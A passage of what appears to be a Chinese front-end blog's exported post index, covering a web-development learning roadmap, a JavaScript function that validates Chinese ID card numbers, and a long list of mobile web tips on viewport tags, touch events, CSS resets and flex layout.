    <content type="text"><![CDATA[首先分享一下我的经验，想做好一件事，必须要花费一些功夫，然后是多学、多思、多练、多交流、多总结，发现自己的问题，然后一定要克服，在状态不好的情况下，往往要及时调整。新手学习前端的话，一定要想想为什么要学习它，是出于一种什么心态，然后定位好自己，多向大牛请教，多教一些没有自己水平高的人，那样往往能让自己成长的快，切勿急躁。初学可以看一些入门视频教程，之后可以买一些书，做一些小项目，要学会投资，分析自己的现状及能力，实时调整，一定要有自己的想法，懂得创新。在这里一定要对自己做分析，然后找出一种适合的学习方法。web前端的学习误区网页制作是计算机专业同学在大学期间都会接触到的一门课程，而学习网页制作所用的第一个集成开发环境(IDE)想必大多是Dreamweaver，这种所见即所得的“吊炸天”IDE为我们制作网页带来了极大的方便。入门快、见效快让我们在不知不觉中已经深深爱上了网页制作。此时，很多人会陷入一个误区，那就是既然借助这么帅的IDE，通过鼠标点击菜单就可以快速方便地制作网页。那么我们为什么还要去学习html、CSS、JavaScrpt、jQuery等这些苦逼的代码呢?这不是舍简求繁吗?但是随着学习的深入，就会发现我们步入了一种窘境——过分的依赖IDE导致我们不清楚其实现的本质，知其然但不知其所以然。因此在页面效果出现问题时，我们便手足无措，更不用提如何进行页面优化以及完成一些更高级的应用了。其原因是显而易见的——聪明的IDE成全了我们的惰性，使我们忽略了华丽的网页背后最本质的内容——code。正确的方向胜过无谓的努力有两只蚂蚁想翻越一段墙，寻找墙那头的食物。一只蚂蚁来到墙脚就毫不犹豫地向上爬去，可是每当它爬到大半时，就会由于劳累、疲倦而跌落下来。虽然它不气馁，一次次跌下来，又迅速地调整一下自己，重新开始向上爬去。另一只蚂蚁观察了一下，决定绕过墙去。很快，这只蚂蚁绕过墙来到食物前，开始享受起来;而另一只蚂蚁还在不停地跌落下去又重新开始。很多时候，成功除了勇气、坚持不懈外，更需要方向。也许有了一个好的方向，成功来得比想象的更快。如果在错误的路上奔跑,再怎么努力也是白搭。学习Web前端也是如此，首先应该选择一个正确的学习路线。结合我的学习经历、近年来辅导学生的经验以及公司中实际项目的需求，在这里将Web前端的学习分为以下几个阶段，具体的学习路线图如图所示。第一阶段:HTML的学习超文本标记语言(HyperText Mark-up Language 简称HTML)是一个网页的骨架，无论是静态网页还是动态网页，最终返回到浏览器端的都是HTML代码，浏览器将HTML代码解释渲染后呈现给用户。因 此，我们必须掌握HTML的基本结构和常用标记及属性。HTML 的学习是一个记忆和理解的过程，在学习过程中可以借助Dreamweaver的“拆分”视图辅助学习。在“设计”视图中看效果，在“代码”视图中学本质， 将各种视图的优势发挥到极致，这种对照学习的方法弥补了单纯识记HTML标签和属性的枯燥乏味，想必对各位初学的小盆友们来说必定是极好的!在学习了HTML之后，我们只是掌握了各种“原材料”的制作方法，要想盖一幢楼房就还需要把这些“原材料”按照我们设计的方案组合布局在一起并进行一些样式的美化。第二个阶段:CSS的学习CSS是英文Cascading Style Sheets的缩写，叫做层叠样式表，是能够真正做到网页表现与内容分离的一种样式设计语言。相对于传统HTML的表现而言其样式是可以复用的，这样就极大地提高了我们开发的速度，降低了维护的成本。同时CSS中的盒子模型、相对布局、绝对布局等能够实现对网页中各对象的位置排版进行像素级的精确控制。通过此阶段的学习，我们就可以顺利完成“一幢楼房”的建设。“楼房”建设完成之后，我们可以交给用户使用，但是如果想让用户获得更佳的体验，我们还可以对“楼房”进行更深一步的“装修”，让它看起来更“豪华”一些。第三个阶段:javascript的学习JavaScript是一种在客户端广泛使用的脚步语言，在JavaScript当中为我们提供了一些内置函数、对象和DOM操作，借助这些内容我们可以来实现一些客户端的特效、验证、交互等，使我们的页面看起来不那么呆板，屌丝瞬间逆袭高富帅!有么有?此时，也许你还沉浸在JavaScript给你带来的惊喜之中，但你的项目经理却突然对你大吼道“这个效果在××浏览器下不兼容，重新搞……”“不兼容?”瞬间石化了有木有?“我擦，坑爹啊!那可是花了我一个晚上写了几百行代码搞定的啊，吐血了都!”JavaScript的兼容性和复杂性有时候的确让我们头疼，还好有“大神”帮我们做了封装。第四个阶段:jQUery的学习jQuery 是一个免费、开源的轻量级的JavaScript库，并且兼容各种浏览器(jQuery2.0及后续版本放弃了对IE6/7/8浏览器的支持)，同时现在有很多基于jQuery的插件可供选择，这样在我们实现一些丰富的动态效果时更方便快捷，大大节省了我们开发的时间，提高了开发速度，这也充分体现了其 write less,do more的核心宗旨。这个Feel倍儿爽!有么有?“豪华大楼”至此拔地而起，但是每天这样日复一日，年复一年的盖楼，好繁琐!能不能将大楼里面每一个单独部件模块化，当需要盖楼时就像堆积木一样组合在一起，这样岂不是爽歪歪?可以实现吗?答案是肯定的。这种思想在Web前端开发中也是适合的，于是乎就出现了各种前端框架，在这里推荐给大家的是Bootstrap。Bootstrap是Twitter推出的一个开源的用于前端开发的工具包，是一个CSS/HTML框架，并且支持响应式布局。一经推出后颇受欢迎，一直是GitHub上的热门开源项目。在项目开发过程中，我们可以借助Bootstrap提供的CSS样式、组件、JavaScript插件等快速的完成页面布局和样式设置，然后再有针对性的微调样式，这样基于框架进行开发大大缩短了开发周期。站在巨人的肩膀上就是爽!Web前端的学习建议最后给大家聊聊在学习Web前端中的一些建议和方法。在CSS布局时需要注意的一个问题是很多同学缺乏对页面布局进行整体分析，不能够从宏观上对页面中盒子间的嵌套关系进行把握，就急于动手去做，导致页面中各元素间的关系很混乱，容易出现盒子在浮动时错位等情况。建议大家在布局时采用“自顶向下，逐步细化”的思想，先用几个盒子将页面从整体上划分，然后逐步在盒子中继续嵌套盒子。“君子生非异也，善假于物也”，在学习的过程中还要多浏览一些优秀的网站，善于分析借鉴其设计思路和布局方法，见多方能识广，进而才可以融会贯通，取他人之长为我所用。同时还要善于使用Firebug这个利器。Firebug一方面可以在我们学习过程中帮助我们调试自己的页面，另一方面我们可以使用Firebug方便地查看、分析别人网站的源代码，“偷”也是一种技能!每个人的成长与基础不一样，结合自己的实际情况，在执行。还是重复一下，前端的核心是js。css不难，但需要来积累。对前端我是这么看的：css就像一瓶酒，得品。html,css总共就那些标签跟选择器属性什么的，但是要写一个有扩展性，健壮性或维护性的页面不容易。现在写页面基本条件反射，不是如何快速的完成，而是思考如果有界面需求修改，怎么在修改代码最少的情况下快速完成需求任务。这是对前端耐力，体力，智力的三重考验。js就像一把剑，得磨。js刚开始只是为了较验，随便技术社会的发展，承担的角色越来越重，刚开始玩玩jQuery感觉已经会js了，其实只是冰山一角。随着对js的了解越来越多，他即变态又可爱，即好玩又难控，即有很多兼容问题，但解决兼容是我们基本生存之道。从ajax到jsmvc一路走一路看，高载潮一浪高过一浪人生就是一场梦，得作。技术只是生活的一部分，曾经雄心斗志，如今低头写码。改变能改变的，接受不能改变的。人生有限，兄争朝夕啊。人生学习的态度是：不急不躁，不快不慢。持之以恒，相信自己。不求能改变世界，但求能改变自己的生活。不求健步如飞，但求一步一脚印。感谢磨难，他使我们内心更为坚强。感谢挫折，他使我们不断的成长，感谢bug，他使我们的思维更加深邃。感谢前端，他使我们更加的相信，撑起一片天空需要十八般武艺。文章部分内容来自于互联网，学对自己有用的东西，感觉有不对的地方可以直接无视，只是一个参考，愿大家的前端之路越走越远。最后附上一张前端开发工程师的技能图：]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>web前端开发学习流程</tag>
        <tag>web前端开发学习路线</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何用javascript正则表达式验证身份证号码是否合法]]></title>
    <url>%2F2015%2F09%2F07%2F%E5%A6%82%E4%BD%95%E7%94%A8javascript%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E9%AA%8C%E8%AF%81%E8%BA%AB%E4%BB%BD%E8%AF%81%E5%8F%B7%E7%A0%81%E6%98%AF%E5%90%A6%E5%90%88%E6%B3%95%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;在用户注册页面有些需求要求的比较严格，需要对身份证js验证是否合法，通过此功能严格此系统软件，从而过滤到很多水客。下面就此实现方法给大家讲解下。&emsp;&emsp;很多时候我们都是通过一组正则表达式来判断用户输入的身份证是否合法，那在用正则表达式判断之前，你对身份证号的组成有多少了解呢？下面来说说一个身份证号里面包含了多少的信息：1、号码的结构&emsp;&emsp;公民身份号码是特征组合码，由十七位数字本体码和一位校验码组成。排列顺序从左至右依次为：六位数字地址码，八位数字出生日期码，三位数字顺序码和一位数字校验码。2、地址码(前六位数）&emsp;&emsp;表示编码对象常住户口所在县(市、旗、区)的行政区划代码，按gb/T2260的规定执行。3、出生日期码（第七位至十四位）&emsp;&emsp;表示编码对象出生的年、月、日，按gb/T7408的规定执行，年、月、日代码之间不用分隔符。4、顺序码（第十五位至十七位）&emsp;&emsp;表示在同一地址码所标识的区域范围内，对同年、同月、同日出生的人编定的顺序号，顺序码的奇数分配给男性，偶数分配给女性。5、校验码（第十八位数）&emsp;&emsp;作为尾号的校验码，是由号码编制单位按统一的公式计算出来的，如果某人的尾号是0－9，都不会出现X，但如果尾号是10，那么就得用X来代替，因为如果用10做尾号，那么 此人的身份证就变成了19位。X是罗马数字的10，用X来代替10，可以保证公民的身份证符合国家标准。在知道身份证号结构组成各部分的意思后，我们开始进入主题：1、定义一个全国地区的对象var aCity={11:”北京”,12:”天津”,13:”河北”,14:”山西”,15:”内蒙古”,21:”辽宁”,22:”吉林”,23:”黑龙江”,31:”上海”,32:”江苏”,33:”浙江”,34:”安徽”,35:”福建”,36:”江西”,37:”山东”,41:”河南”,42:”湖北”,43:”湖南”,44:”广东”,45:”广西”,46:”海南”,50:”重庆”,51:”四川”,52:”贵州”,53:”云南”,54:”西藏”,61:”陕西”,62:”甘肃”,63:”青海”,64:”宁夏”,65:”新疆”,71:”台湾”,81:”香港”,82:”澳门”,91:”国外”}2、正则表达式判断1234567891011121314function isCardID(sId)&#123;var iSum=0 ;var info="" ;if(!/^\d&#123;17&#125;(\d|x)$/i.test(sId)) return "你输入的身份证长度或格式错误";sId=sId.replace(/x$/i,"a");if(aCity[parseInt(sId.substr(0,2))]==null) return "你的身份证地区非法";sBirthday=sId.substr(6,4)+"-"+Number(sId.substr(10,2))+"-"+Number(sId.substr(12,2));var d=new Date(sBirthday.replace(/-/g,"/")) ;if(sBirthday!=(d.getFullYear()+"-"+ (d.getMonth()+1) + "-" + d.getDate()))return "身份证上的出生日期非法";for(var i = 17;i&gt;=0;i --) iSum += (Math.pow(2,i) % 11) * parseInt(sId.charAt(17 - i),11) ;if(iSum%11!=1) return "你输入的身份证号非法";//aCity[parseInt(sId.substr(0,2))]+","+sBirthday+","+(sId.substr(16,1)%2?"男":"女");//此次还可以判断出输入的身份证号的人性别return true;&#125;&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js验证身份证是否合法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动前端开发知识资源整理]]></title>
    <url>%2F2015%2F09%2F07%2F%E7%A7%BB%E5%8A%A8%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E7%9F%A5%E8%AF%86%E8%B5%84%E6%BA%90%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[meta基础知识H5页面窗口自动调整到设备宽度，并禁止用户缩放页面1&lt;meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no" /&gt;忽略将页面中的数字识别为电话号码1&lt;meta name="format-detection" content="telephone=no" /&gt;忽略Android平台中对邮箱地址的识别1&lt;meta name="format-detection" content="email=no" /&gt;当网站添加到主屏幕快速启动方式，可隐藏地址栏，仅针对ios的safari12&lt;meta name="apple-mobile-web-app-capable" content="yes" /&gt; &lt;!-- ios7.0版本以后，safari上已看不到效果 --&gt;将网站添加到主屏幕快速启动方式，仅针对ios的safari顶端状态条的样式12&lt;meta name="apple-mobile-web-app-status-bar-style" content="black" /&gt; &lt;!-- 可选default、black、black-translucent --&gt;viewport模板12345678910111213141516&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;meta content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no" name="viewport"&gt; &lt;meta content="yes" name="apple-mobile-web-app-capable"&gt; &lt;meta content="black" name="apple-mobile-web-app-status-bar-style"&gt; &lt;meta content="telephone=no" name="format-detection"&gt; &lt;meta content="email=no" name="format-detection"&gt; &lt;title&gt;标题&lt;/title&gt; &lt;link rel="stylesheet" href="index.css"&gt; &lt;/head&gt;&lt;body&gt;这里开始内容&lt;/body&gt;&lt;/html&gt;&nbsp;常见问题移动端如何定义字体font-family中文字体使用系统默认即可，英文用Helvetica12/* 移动端定义字体的代码 */body&#123;font-family:Helvetica;&#125;参考《移动web页面使用微软雅黑字体的问题》&nbsp;移动端字体单位font-size选择px还是rem对于只需要适配手机设备，使用px即可对于需要适配各种移动设备，使用rem，例如只需要适配iPhone和iPad等分辨率差别比较挺大的设备rem配置参考12345678html&#123;font-size:10px&#125;@media screen and (min-width:321px) and (max-width:375px)&#123;html&#123;font-size:11px&#125;&#125;@media screen and (min-width:376px) and (max-width:414px)&#123;html&#123;font-size:12px&#125;&#125;@media screen and (min-width:415px) and (max-width:639px)&#123;html&#123;font-size:15px&#125;&#125;@media screen and (min-width:640px) and (max-width:719px)&#123;html&#123;font-size:20px&#125;&#125;@media screen and (min-width:720px) and (max-width:749px)&#123;html&#123;font-size:22.5px&#125;&#125;@media screen and (min-width:750px) and (max-width:799px)&#123;html&#123;font-size:23.5px&#125;&#125;@media screen and (min-width:800px)&#123;html&#123;font-size:25px&#125;&#125;&nbsp;移动端touch事件(区分webkit 和 winphone)当用户手指放在移动设备在屏幕上滑动会触发的touch事件以下支持webkittouchstart——当手指触碰屏幕时候发生。不管当前有多少只手指touchmove——当手指在屏幕上滑动时连续触发。通常我们再滑屏页面，会调用event的preventDefault()可以阻止默认情况的发生：阻止页面滚动touchend——当手指离开屏幕时触发touchcancel——系统停止跟踪触摸时候会触发。例如在触摸过程中突然页面alert()一个提示框，此时会触发该事件，这个事件比较少用以下支持winphone 8MSPointerDown——当手指触碰屏幕时候发生。不管当前有多少只手指MSPointerMove——当手指在屏幕上滑动时连续触发。通常我们再滑屏页面，会调用css的html{-ms-touch-action: none;}可以阻止默认情况的发生：阻止页面滚动MSPointerUp——当手指离开屏幕时触发移动端click屏幕产生200-300 ms的延迟响应移动设备上的web网页是有300ms延迟的，玩玩会造成按钮点击延迟甚至是点击失效。以下是历史原因，来源一个公司内一个同事的分享：2007年苹果发布首款iphone上IOS系统搭载的safari为了将适用于PC端上大屏幕的网页能比较好的展示在手机端上，使用了双击缩放(double tap to zoom)的方案，比如你在手机上用浏览器打开一个PC上的网页，你可能在看到页面内容虽然可以撑满整个屏幕，但是字体、图片都很小看不清，此时可以快速双击屏幕上的某一部分，你就能看清该部分放大后的内容，再次双击后能回到原始状态。双击缩放是指用手指在屏幕上快速点击两次，iOS 自带的 Safari 浏览器会将网页缩放至原始比例。原因就出在浏览器需要如何判断快速点击上，当用户在屏幕上单击某一个元素时候，例如跳转链接&lt;a href=&quot;#&quot;&gt;&lt;/a&gt;，此处浏览器会先捕获该次单击，但浏览器不能决定用户是单纯要点击链接还是要双击该部分区域进行缩放操作，所以，捕获第一次单击后，浏览器会先Hold一段时间t，如果在t时间区间里用户未进行下一次点击，则浏览器会做单击跳转链接的处理，如果t时间里用户进行了第二次单击操作，则浏览器会禁止跳转，转而进行对该部分区域页面的缩放操作。那么这个时间区间t有多少呢？在IOS safari下，大概为300毫秒。这就是延迟的由来。造成的后果用户纯粹单击页面，页面需要过一段时间才响应，给用户慢体验感觉，对于web开发者来说是，页面js捕获click事件的回调函数处理，需要300ms后才生效，也就间接导致影响其他业务逻辑的处理。解决方案：fastclick可以解决在手机上点击事件的300ms延迟zepto的touch模块，tap事件也是为了解决在click的延迟问题&nbsp;触摸事件的响应顺序1、ontouchstart2、ontouchmove3、ontouchend4、onclick解决300ms延迟的问题，也可以通过绑定ontouchstart事件，加快对事件的响应&nbsp;什么是Retina 显示屏，带来了什么问题retina：一种具备超高像素密度的液晶屏，同样大小的屏幕上显示的像素点由1个变为多个，如在同样带下的屏幕上，苹果设备的retina显示屏中，像素点1个变为4个在高清显示屏中的位图被放大，图片会变得模糊，因此移动端的视觉稿通常会设计为传统PC的2倍那么，前端的应对方案是：设计稿切出来的图片长宽保证为偶数，并使用backgroud-size把图片缩小为原来的1/212//例如图片宽高为：200px*200px，那么写法如下.css&#123;width:100px;height:100px;background-size:100px 100px;&#125;其它元素的取值为原来的1/2，例如视觉稿40px的字体，使用样式的写法为20px1.css&#123;font-size:20px&#125;&nbsp;ios系统中元素被触摸时产生的半透明灰色遮罩怎么去掉ios用户点击一个链接，会出现一个半透明灰色遮罩, 如果想要禁用，可设置-webkit-tap-highlight-color的alpha值为0，也就是属性值的最后一位设置为0就可以去除半透明灰色遮罩1a,button,input,textarea&#123;-webkit-tap-highlight-color: rgba(0,0,0,0;)&#125;&nbsp;部分android系统中元素被点击时产生的边框怎么去掉android用户点击一个链接，会出现一个边框或者半透明灰色遮罩, 不同生产商定义出来额效果不一样，可设置-webkit-tap-highlight-color的alpha值为0去除部分机器自带的效果1234a,button,input,textarea&#123;-webkit-tap-highlight-color: rgba(0,0,0,0;)-webkit-user-modify:read-write-plaintext-only;&#125;-webkit-user-modify有个副作用，就是输入法不再能够输入多个字符另外，有些机型去除不了，如小米2对于按钮类还有个办法，不使用a或者input标签，直接用div标签参考《如何去除android上a标签产生的边框》&nbsp;winphone系统a、input标签被点击时产生的半透明灰色背景怎么去掉1&lt;meta name="msapplication-tap-highlight" content="no"&gt;&nbsp;webkit表单元素的默认外观怎么重置1.css&#123;-webkit-appearance:none;&#125;&nbsp;webkit表单输入框placeholder的颜色值能改变么12input::-webkit-input-placeholder&#123;color:#AAAAAA;&#125;input:focus::-webkit-input-placeholder&#123;color:#EEEEEE;&#125;webkit表单输入框placeholder的文字能换行么ios可以，android不行~在textarea标签下都可以换行~IE10（winphone8）表单元素默认外观如何重置禁用 select 默认下拉箭头::-ms-expand 适用于表单选择控件下拉箭头的修改，有多个属性值，设置它隐藏 (display:none) 并使用背景图片来修饰可得到我们想要的效果。123select::-ms-expand &#123;display: none;&#125;禁用 radio 和 checkbox 默认样式::-ms-check 适用于表单复选框或单选按钮默认图标的修改，同样有多个属性值，设置它隐藏 (display:none) 并使用背景图片来修饰可得到我们想要的效果。123input[type=radio]::-ms-check,input[type=checkbox]::-ms-check&#123;display: none;&#125;禁用PC端表单输入框默认清除按钮当表单文本输入框输入内容后会显示文本清除按钮，::-ms-clear 适用于该清除按钮的修改，同样设置使它隐藏 (display:none) 并使用背景图片来修饰可得到我们想要的效果。123input[type=text]::-ms-clear,input[type=tel]::-ms-clear,input[type=number]::-ms-clear&#123;display: none;&#125;禁止ios 长按时不触发系统的菜单，禁止ios&amp;android长按时下载图片1.css&#123;-webkit-touch-callout: none&#125;禁止ios和android用户选中文字1.css&#123;-webkit-user-select:none&#125;&nbsp;打电话发短信的怎么实现打电话1&lt;a href="tel:0755-10086"&gt;打电话给:0755-10086&lt;/a&gt;发短信，winphone系统无效1&lt;a href="sms:10086"&gt;发短信给: 10086&lt;/a&gt;模拟按钮hover效果移动端触摸按钮的效果，可明示用户有些事情正要发生，是一个比较好体验，但是移动设备中并没有鼠标指针，使用css的hover并不能满足我们的需求，还好国外有个激活css的active效果，代码如下，123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;meta content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no" name="viewport"&gt;&lt;meta content="yes" name="apple-mobile-web-app-capable"&gt;&lt;meta content="black" name="apple-mobile-web-app-status-bar-style"&gt;&lt;meta content="telephone=no" name="format-detection"&gt;&lt;meta content="email=no" name="format-detection"&gt;&lt;style type="text/css"&gt;a&#123;-webkit-tap-highlight-color: rgba(0,0,0,0);&#125;.btn-blue&#123;display:block;height:42px;line-height:42px;text-align:center;border-radius:4px;font-size:18px;color:#FFFFFF;background-color: #4185F3;&#125;.btn-blue:active&#123;background-color: #357AE8;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="btn-blue"&gt;按钮&lt;/div&gt;&lt;script type="text/javascript"&gt;document.addEventListener("touchstart", function()&#123;&#125;, true)&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;兼容性ios5+、部分android 4+、winphone 8要做到全兼容的办法，可通过绑定ontouchstart和ontouchend来控制按钮的类名123456789101112131415161718192021222324252627282930&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;meta content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no" name="viewport"&gt;&lt;meta content="yes" name="apple-mobile-web-app-capable"&gt;&lt;meta content="black" name="apple-mobile-web-app-status-bar-style"&gt;&lt;meta content="telephone=no" name="format-detection"&gt;&lt;meta content="email=no" name="format-detection"&gt;&lt;style type="text/css"&gt;a&#123;-webkit-tap-highlight-color: rgba(0,0,0,0);&#125;.btn-blue&#123;display:block;height:42px;line-height:42px;text-align:center;border-radius:4px;font-size:18px;color:#FFFFFF;background-color: #4185F3;&#125;.btn-blue-on&#123;background-color: #357AE8;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="btn-blue"&gt;按钮&lt;/div&gt;&lt;script type="text/javascript"&gt;var btnBlue = document.querySelector(".btn-blue");btnBlue.ontouchstart = function()&#123;this.className = "btn-blue btn-blue-on"&#125;btnBlue.ontouchend = function()&#123;this.className = "btn-blue"&#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;&nbsp;屏幕旋转的事件和样式事件window.orientation，取值：正负90表示横屏模式、0和180表现为竖屏模式；1234567891011window.onorientationchange = function()&#123;switch(window.orientation)&#123;case -90:case 90:alert("横屏:" + window.orientation);case 0:case 180:alert("竖屏:" + window.orientation);break;&#125;&#125;样式123456789//竖屏时使用的样式@media all and (orientation:portrait) &#123;.css&#123;&#125;&#125;//横屏时使用的样式@media all and (orientation:landscape) &#123;.css&#123;&#125;&#125;&nbsp;audio元素和video元素在ios和andriod中无法自动播放应对方案：触屏即播123$('html').one('touchstart',function()&#123;audio.play()&#125;)可参考《无法自动播放的audio元素》&nbsp;摇一摇功能HTML5 deviceMotion：封装了运动传感器数据的事件，可以获取手机运动状态下的运动加速度等数据。&nbsp;手机拍照和上传图片&lt;input type=&quot;file&quot;&gt;的accept 属性1234&lt;!-- 选择照片 --&gt;&lt;input type=file accept="image/*"&gt;&lt;!-- 选择视频 --&gt;&lt;input type=file accept="video/*"&gt;使用总结：ios 有拍照、录像、选取本地图片功能部分android只有选取本地图片功能winphone不支持input控件默认外观丑陋&nbsp;微信浏览器用户调整字体大小后页面矬了，怎么阻止用户调整原因android侧是复写了layoutinflater 对textview做了统一处理ios侧是修改了body.style.webkitTextSizeAdjust值解决方案：android使用以下代码，该接口只在微信浏览器下有效12345678910111213141516171819202122/*** 页面加入这段代码可使Android机器页面不再受到用户字体缩放强制改变大小* 但是会有一个1秒左右的延迟，期间可以考虑通过loading展示* 仅供参考*/(function()&#123;if (typeof(WeixinJSBridge) == "undefined") &#123;document.addEventListener("WeixinJSBridgeReady", function (e) &#123;setTimeout(function()&#123;WeixinJSBridge.invoke('setFontSizeCallback',&#123;"fontSize":0&#125;, function(res) &#123;alert(JSON.stringify(res));&#125;);&#125;,0);&#125;);&#125; else &#123;setTimeout(function()&#123;WeixinJSBridge.invoke('setFontSizeCallback',&#123;"fontSize":0&#125;, function(res) &#123;alert(JSON.stringify(res));&#125;);&#125;,0);&#125;&#125;)();ios使用-webkit-text-size-adjust禁止调整字体大小body{-webkit-text-size-adjust: 100%!important;}最好的解决方案：整个页面用rem或者百分比布局&nbsp;消除transition闪屏网络都是这么写的，但我并没有测试出来123456.css&#123;/*设置内嵌的元素在 3D 空间如何呈现：保留 3D*/-webkit-transform-style: preserve-3d;/*（设置进行转换的元素的背面在面对用户时是否可见：隐藏）*/-webkit-backface-visibility: hidden;&#125;开启硬件加速解决页面闪白保证动画流畅123456.css &#123;-webkit-transform: translate3d(0, 0, 0);-moz-transform: translate3d(0, 0, 0);-ms-transform: translate3d(0, 0, 0);transform: translate3d(0, 0, 0);&#125;参考《用CSS开启硬件加速来提高网站性能》&nbsp;取消input在ios下，输入的时候英文首字母的默认大写1&lt;input autocapitalize="off" autocorrect="off" /&gt;&nbsp;android 上去掉语音输入按钮1input::-webkit-input-speech-button &#123;display: none&#125;android 2.3 bug@-webkit-keyframes 需要以0%开始100%结束，0%的百分号不能去掉after和before伪类无法使用动画border-radius不支持%单位translate百分比的写法和scale在一起会导致失效，例如-webkit-transform:translate(-50%,-50%) scale(-0.5, 1)android 4.x bug三星 Galaxy S4中自带浏览器不支持border-radius缩写同时设置border-radius和背景色的时候，背景色会溢出到圆角以外部分部分手机(如三星)，a链接支持鼠标:visited事件，也就是说链接访问后文字变为紫色参考《border-radius 移动之伤》&nbsp;设计高性能CSS3动画的几个要素尽可能地使用合成属性transform和opacity来设计CSS3动画，不使用position的left和top来定位利用translate3D开启GPU加速参考《High Performance Animations》&nbsp;fixed bugios下fixed元素容易定位出错，软键盘弹出时，影响fixed元素定位android下fixed表现要比iOS更好，软键盘弹出时，不会影响fixed元素定位ios4下不支持position:fixed解决方案可用isroll.js，暂无完美方案&nbsp;如何阻止windows Phone的默认触摸事件winphone下默认触摸事件事件使用e.preventDefault是无效的目前解决方法是使用样式来禁用1html&#123;-ms-touch-action: none;&#125;/* 禁止winphone默认触摸事件 */参考《Windows phone 8 touch support》&nbsp;常用的移动端框架zepto.js语法与jquery几乎一样，会jquery基本会zepto~最新版本已经更新到1.16官网：http://zeptojs.com/中文(非官网)：http://www.css88.com/doc/zeptojs_api/常使用的扩展模块：浏览器检测：https://github.com/madrobby/zepto/blob/master/src/detect.jstap事件：https://github.com/madrobby/zepto/blob/master/src/touch.js&nbsp;iscroll.js解决页面不支持弹性滚动，不支持fixed引起的问题~实现下拉刷新，滑屏，缩放等功能~最新版本已经更新到5.0官网：http://cubiq.org/iscroll-5&nbsp;underscore.js笔者没用过，不过听说好用，推荐给大家~该库提供了一整套函数式编程的实用功能，但是没有扩展任何JavaScript内置对象。最新版本已经更新到1.8.2官网：http://underscorejs.org/&nbsp;滑屏框架适合上下滑屏、左右滑屏等滑屏切换页面的效果slip.jsiSlider.jsfullpage.js&nbsp;flex布局flex布局目前可使用在移动中，并非所有的语法都全兼容，但以下写法笔者实践过，效果良好~123456789101112131415/* ============================================================flex：定义布局为盒模型flex-v：盒模型垂直布局flex-1：子元素占据剩余的空间flex-align-center：子元素垂直居中flex-pack-center：子元素水平居中flex-pack-justify：子元素两端对齐兼容性：ios 4+、android 2.3+、winphone8+============================================================ */.flex&#123;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;&#125;.flex-v&#123;-webkit-box-orient:vertical;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;&#125;.flex-1&#123;-webkit-box-flex:1;-webkit-flex:1;-ms-flex:1;flex:1;&#125;.flex-align-center&#123;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;&#125;.flex-pack-center&#123;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;&#125;.flex-pack-justify&#123;-webkit-box-pack:justify;-webkit-justify-content:space-between;-ms-flex-pack:justify;justify-content:space-between;&#125;示例：两端对齐1234567891011121314151617181920212223242526272829303132333435363738&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;meta content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no" name="viewport"&gt;&lt;meta content="yes" name="apple-mobile-web-app-capable"&gt;&lt;meta content="black" name="apple-mobile-web-app-status-bar-style"&gt;&lt;meta content="telephone=no" name="format-detection"&gt;&lt;meta content="email=no" name="format-detection"&gt;&lt;style type="text/css"&gt;/* ============================================================flex：定义布局为盒模型flex-v：盒模型垂直布局flex-1：子元素占据剩余的空间flex-align-center：子元素垂直居中flex-pack-center：子元素水平居中flex-pack-justify：子元素两端对齐兼容性：ios 4+、android 2.3+、winphone8+============================================================ */.flex&#123;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;&#125;.flex-v&#123;-webkit-box-orient:vertical;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;&#125;.flex-1&#123;-webkit-box-flex:1;-webkit-flex:1;-ms-flex:1;flex:1;&#125;.flex-align-center&#123;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;&#125;.flex-pack-center&#123;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;&#125;.flex-pack-justify&#123;-webkit-box-pack:justify;-webkit-justify-content:space-between;-ms-flex-pack:justify;justify-content:space-between;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="flex flex-pack-justify"&gt;&lt;div&gt;模块一&lt;/div&gt;&lt;div&gt;模块二&lt;/div&gt;&lt;div&gt;模块三&lt;/div&gt;&lt;div&gt;模块四&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;使用注意：flex下的子元素必须为块级元素，非块级元素在android2.3机器下flex失效FastClick消除在移动浏览器上触发click事件与一个物理Tap(敲击)之间的300延迟参考《FastClick》]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>移动前端知识整理</tag>
        <tag>移动前端资源整理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[border-radius 移动之伤]]></title>
